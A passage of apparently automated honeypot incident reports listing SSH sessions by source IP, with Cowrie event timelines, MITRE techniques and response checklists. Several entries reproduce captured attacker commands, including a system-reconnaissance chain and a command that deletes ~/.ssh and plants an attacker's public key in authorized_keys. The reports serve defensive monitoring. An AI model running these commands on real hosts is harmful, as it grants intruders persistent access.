- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c40c3042b4d7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:33 |
| **Last Seen** | 2026-07-24 20:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:33:28` | `cowrie.session.connect` |
| `2026-07-24 20:33:28` | `cowrie.client.version` |
| `2026-07-24 20:33:28` | `cowrie.client.kex` |
| `2026-07-24 20:33:30` | `cowrie.login.success` |
| `2026-07-24 20:33:31` | `cowrie.session.params` |
| `2026-07-24 20:33:31` | `cowrie.command.input` |
| `2026-07-24 20:33:31` | `cowrie.command.input` |
| `2026-07-24 20:33:31` | `cowrie.command.input` |
| `2026-07-24 20:33:31` | `cowrie.command.input` |
| `2026-07-24 20:33:31` | `cowrie.command.input` |
| `2026-07-24 20:33:31` | `cowrie.command.success` |
| `2026-07-24 20:33:31` | `cowrie.command.input` |
| `2026-07-24 20:33:31` | `cowrie.command.input` |
| `2026-07-24 20:33:31` | `cowrie.command.input` |
| `2026-07-24 20:33:31` | `cowrie.command.input` |
| `2026-07-24 20:33:32` | `cowrie.log.closed` |
| `2026-07-24 20:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7001f14939ad

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:34 |
| **Last Seen** | 2026-07-24 20:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:34:39` | `cowrie.session.connect` |
| `2026-07-24 20:34:39` | `cowrie.client.version` |
| `2026-07-24 20:34:39` | `cowrie.client.kex` |
| `2026-07-24 20:34:41` | `cowrie.login.success` |
| `2026-07-24 20:34:42` | `cowrie.session.params` |
| `2026-07-24 20:34:42` | `cowrie.command.input` |
| `2026-07-24 20:34:42` | `cowrie.command.input` |
| `2026-07-24 20:34:42` | `cowrie.command.input` |
| `2026-07-24 20:34:42` | `cowrie.command.input` |
| `2026-07-24 20:34:42` | `cowrie.command.input` |
| `2026-07-24 20:34:42` | `cowrie.command.success` |
| `2026-07-24 20:34:42` | `cowrie.command.input` |
| `2026-07-24 20:34:42` | `cowrie.command.input` |
| `2026-07-24 20:34:42` | `cowrie.command.input` |
| `2026-07-24 20:34:42` | `cowrie.command.input` |
| `2026-07-24 20:34:43` | `cowrie.log.closed` |
| `2026-07-24 20:34:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-296329a37877

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:35 |
| **Last Seen** | 2026-07-24 20:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:35:49` | `cowrie.session.connect` |
| `2026-07-24 20:35:49` | `cowrie.client.version` |
| `2026-07-24 20:35:49` | `cowrie.client.kex` |
| `2026-07-24 20:35:51` | `cowrie.login.success` |
| `2026-07-24 20:35:52` | `cowrie.session.params` |
| `2026-07-24 20:35:52` | `cowrie.command.input` |
| `2026-07-24 20:35:52` | `cowrie.command.input` |
| `2026-07-24 20:35:52` | `cowrie.command.input` |
| `2026-07-24 20:35:52` | `cowrie.command.input` |
| `2026-07-24 20:35:52` | `cowrie.command.input` |
| `2026-07-24 20:35:52` | `cowrie.command.success` |
| `2026-07-24 20:35:52` | `cowrie.command.input` |
| `2026-07-24 20:35:52` | `cowrie.command.input` |
| `2026-07-24 20:35:52` | `cowrie.command.input` |
| `2026-07-24 20:35:52` | `cowrie.command.input` |
| `2026-07-24 20:35:52` | `cowrie.log.closed` |
| `2026-07-24 20:35:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42c93a3cfbc8

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-07-24 20:36 |
| **Last Seen** | 2026-07-24 20:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:36:42` | `cowrie.session.connect` |
| `2026-07-24 20:36:42` | `cowrie.client.version` |
| `2026-07-24 20:36:42` | `cowrie.client.kex` |
| `2026-07-24 20:36:43` | `cowrie.login.success` |
| `2026-07-24 20:36:44` | `cowrie.session.params` |
| `2026-07-24 20:36:44` | `cowrie.command.input` |
| `2026-07-24 20:36:44` | `cowrie.command.failed` |
| `2026-07-24 20:36:44` | `cowrie.log.closed` |
| `2026-07-24 20:36:45` | `cowrie.session.params` |
| `2026-07-24 20:36:45` | `cowrie.command.input` |
| `2026-07-24 20:36:45` | `cowrie.session.file_download` |
| `2026-07-24 20:36:45` | `cowrie.log.closed` |
| `2026-07-24 20:36:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60e339ab4558

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-07-24 20:36 |
| **Last Seen** | 2026-07-24 20:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:36:46` | `cowrie.session.connect` |
| `2026-07-24 20:36:46` | `cowrie.client.version` |
| `2026-07-24 20:36:46` | `cowrie.client.kex` |
| `2026-07-24 20:36:47` | `cowrie.login.success` |
| `2026-07-24 20:36:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d08daa77b833

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-07-24 20:36 |
| **Last Seen** | 2026-07-24 20:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:36:47` | `cowrie.session.connect` |
| `2026-07-24 20:36:47` | `cowrie.client.version` |
| `2026-07-24 20:36:47` | `cowrie.client.kex` |
| `2026-07-24 20:36:48` | `cowrie.login.success` |
| `2026-07-24 20:36:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c37ef7367ec3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:36 |
| **Last Seen** | 2026-07-24 20:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:36:59` | `cowrie.session.connect` |
| `2026-07-24 20:36:59` | `cowrie.client.version` |
| `2026-07-24 20:36:59` | `cowrie.client.kex` |
| `2026-07-24 20:37:00` | `cowrie.login.success` |
| `2026-07-24 20:37:02` | `cowrie.session.params` |
| `2026-07-24 20:37:02` | `cowrie.command.input` |
| `2026-07-24 20:37:02` | `cowrie.command.input` |
| `2026-07-24 20:37:02` | `cowrie.command.input` |
| `2026-07-24 20:37:02` | `cowrie.command.input` |
| `2026-07-24 20:37:02` | `cowrie.command.input` |
| `2026-07-24 20:37:02` | `cowrie.command.success` |
| `2026-07-24 20:37:02` | `cowrie.command.input` |
| `2026-07-24 20:37:02` | `cowrie.command.input` |
| `2026-07-24 20:37:02` | `cowrie.command.input` |
| `2026-07-24 20:37:02` | `cowrie.command.input` |
| `2026-07-24 20:37:02` | `cowrie.log.closed` |
| `2026-07-24 20:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27ac27d552b3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:38 |
| **Last Seen** | 2026-07-24 20:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:38:10` | `cowrie.session.connect` |
| `2026-07-24 20:38:10` | `cowrie.client.version` |
| `2026-07-24 20:38:10` | `cowrie.client.kex` |
| `2026-07-24 20:38:12` | `cowrie.login.success` |
| `2026-07-24 20:38:13` | `cowrie.session.params` |
| `2026-07-24 20:38:13` | `cowrie.command.input` |
| `2026-07-24 20:38:13` | `cowrie.command.input` |
| `2026-07-24 20:38:13` | `cowrie.command.input` |
| `2026-07-24 20:38:13` | `cowrie.command.input` |
| `2026-07-24 20:38:13` | `cowrie.command.input` |
| `2026-07-24 20:38:13` | `cowrie.command.success` |
| `2026-07-24 20:38:13` | `cowrie.command.input` |
| `2026-07-24 20:38:13` | `cowrie.command.input` |
| `2026-07-24 20:38:13` | `cowrie.command.input` |
| `2026-07-24 20:38:13` | `cowrie.command.input` |
| `2026-07-24 20:38:13` | `cowrie.log.closed` |
| `2026-07-24 20:38:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b76af62cd3b2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:39 |
| **Last Seen** | 2026-07-24 20:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:39:20` | `cowrie.session.connect` |
| `2026-07-24 20:39:20` | `cowrie.client.version` |
| `2026-07-24 20:39:20` | `cowrie.client.kex` |
| `2026-07-24 20:39:22` | `cowrie.login.success` |
| `2026-07-24 20:39:23` | `cowrie.session.params` |
| `2026-07-24 20:39:23` | `cowrie.command.input` |
| `2026-07-24 20:39:23` | `cowrie.command.input` |
| `2026-07-24 20:39:23` | `cowrie.command.input` |
| `2026-07-24 20:39:23` | `cowrie.command.input` |
| `2026-07-24 20:39:23` | `cowrie.command.input` |
| `2026-07-24 20:39:23` | `cowrie.command.success` |
| `2026-07-24 20:39:23` | `cowrie.command.input` |
| `2026-07-24 20:39:23` | `cowrie.command.input` |
| `2026-07-24 20:39:23` | `cowrie.command.input` |
| `2026-07-24 20:39:23` | `cowrie.command.input` |
| `2026-07-24 20:39:24` | `cowrie.log.closed` |
| `2026-07-24 20:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aa04799c24d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:40 |
| **Last Seen** | 2026-07-24 20:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:40:31` | `cowrie.session.connect` |
| `2026-07-24 20:40:31` | `cowrie.client.version` |
| `2026-07-24 20:40:31` | `cowrie.client.kex` |
| `2026-07-24 20:40:32` | `cowrie.login.success` |
| `2026-07-24 20:40:34` | `cowrie.session.params` |
| `2026-07-24 20:40:34` | `cowrie.command.input` |
| `2026-07-24 20:40:34` | `cowrie.command.input` |
| `2026-07-24 20:40:34` | `cowrie.command.input` |
| `2026-07-24 20:40:34` | `cowrie.command.input` |
| `2026-07-24 20:40:34` | `cowrie.command.input` |
| `2026-07-24 20:40:34` | `cowrie.command.success` |
| `2026-07-24 20:40:34` | `cowrie.command.input` |
| `2026-07-24 20:40:34` | `cowrie.command.input` |
| `2026-07-24 20:40:34` | `cowrie.command.input` |
| `2026-07-24 20:40:34` | `cowrie.command.input` |
| `2026-07-24 20:40:34` | `cowrie.log.closed` |
| `2026-07-24 20:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c5125eacc7a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-24 20:40 |
| **Last Seen** | 2026-07-24 20:41 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:40:57` | `cowrie.session.connect` |
| `2026-07-24 20:40:58` | `cowrie.client.version` |
| `2026-07-24 20:40:58` | `cowrie.client.kex` |
| `2026-07-24 20:41:07` | `cowrie.login.success` |
| `2026-07-24 20:41:11` | `cowrie.session.params` |
| `2026-07-24 20:41:11` | `cowrie.command.input` |
| `2026-07-24 20:41:11` | `cowrie.command.input` |
| `2026-07-24 20:41:11` | `cowrie.command.input` |
| `2026-07-24 20:41:11` | `cowrie.command.input` |
| `2026-07-24 20:41:11` | `cowrie.command.input` |
| `2026-07-24 20:41:11` | `cowrie.command.success` |
| `2026-07-24 20:41:11` | `cowrie.command.input` |
| `2026-07-24 20:41:11` | `cowrie.command.input` |
| `2026-07-24 20:41:11` | `cowrie.command.input` |
| `2026-07-24 20:41:11` | `cowrie.command.input` |
| `2026-07-24 20:41:13` | `cowrie.log.closed` |
| `2026-07-24 20:41:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cd00ed129c3

| Field | Detail |
|---|---|
| **Source IP** | `59.92.51[.]186` |
| **First Seen** | 2026-07-24 20:41 |
| **Last Seen** | 2026-07-24 20:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:41:28` | `cowrie.session.connect` |
| `2026-07-24 20:41:28` | `cowrie.client.version` |
| `2026-07-24 20:41:28` | `cowrie.client.kex` |
| `2026-07-24 20:41:30` | `cowrie.login.success` |
| `2026-07-24 20:41:30` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:41:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.92.51[.]186` to AbuseIPDB if not already reported
- [ ] Block `59.92.51[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bebf0abc0fd

| Field | Detail |
|---|---|
| **Source IP** | `121.189.198[.]60` |
| **First Seen** | 2026-07-24 20:41 |
| **Last Seen** | 2026-07-24 20:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:41:36` | `cowrie.session.connect` |
| `2026-07-24 20:41:36` | `cowrie.client.version` |
| `2026-07-24 20:41:36` | `cowrie.client.kex` |
| `2026-07-24 20:41:38` | `cowrie.login.success` |
| `2026-07-24 20:41:39` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.198[.]60` to AbuseIPDB if not already reported
- [ ] Block `121.189.198[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-801723b0cb56

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:41 |
| **Last Seen** | 2026-07-24 20:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:41:39` | `cowrie.session.connect` |
| `2026-07-24 20:41:40` | `cowrie.client.version` |
| `2026-07-24 20:41:40` | `cowrie.client.kex` |
| `2026-07-24 20:41:41` | `cowrie.login.success` |
| `2026-07-24 20:41:42` | `cowrie.session.params` |
| `2026-07-24 20:41:42` | `cowrie.command.input` |
| `2026-07-24 20:41:42` | `cowrie.command.input` |
| `2026-07-24 20:41:42` | `cowrie.command.input` |
| `2026-07-24 20:41:42` | `cowrie.command.input` |
| `2026-07-24 20:41:42` | `cowrie.command.input` |
| `2026-07-24 20:41:42` | `cowrie.command.success` |
| `2026-07-24 20:41:42` | `cowrie.command.input` |
| `2026-07-24 20:41:42` | `cowrie.command.input` |
| `2026-07-24 20:41:42` | `cowrie.command.input` |
| `2026-07-24 20:41:42` | `cowrie.command.input` |
| `2026-07-24 20:41:43` | `cowrie.log.closed` |
| `2026-07-24 20:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b0707141aea

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:42 |
| **Last Seen** | 2026-07-24 20:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
